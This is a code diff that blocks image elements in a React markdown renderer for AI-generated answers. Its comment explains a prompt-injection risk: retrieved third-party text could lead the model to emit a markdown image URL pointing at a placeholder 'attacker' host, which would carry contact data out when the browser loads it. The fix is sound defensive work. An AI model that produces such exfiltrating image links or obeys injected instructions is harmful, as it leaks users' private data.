@@ -74,6 +74,15 @@ export function AnswerMarkdown({
     <div className="md-answer text-[14.5px] leading-[1.7] text-ink">
       <ReactMarkdown
         remarkPlugins={[remarkGfm]}
+        // Retrieved third-party material — vault excerpts, web results, claim
+        // statements any member can type — reaches the model in its *system*
+        // prompt, so an answer can be talked into emitting
+        // `![](https://attacker/?d=<the contacts above>)`. The browser would
+        // fire that GET with no click, exfiltrating whatever the model pasted
+        // into the URL. Nothing legitimate puts an image in an answer, so drop
+        // the element outright. The worker's PDF renderers close the same hole
+        // on their side (`worker/pdf.py`, 3 Sep 2026).
+        disallowedElements={["img"]}
         components={{
           p: ({ children }) => <p>{wrap(children)}</p>,
           li: ({ children }) => <li>{wrap(children)}</li>,
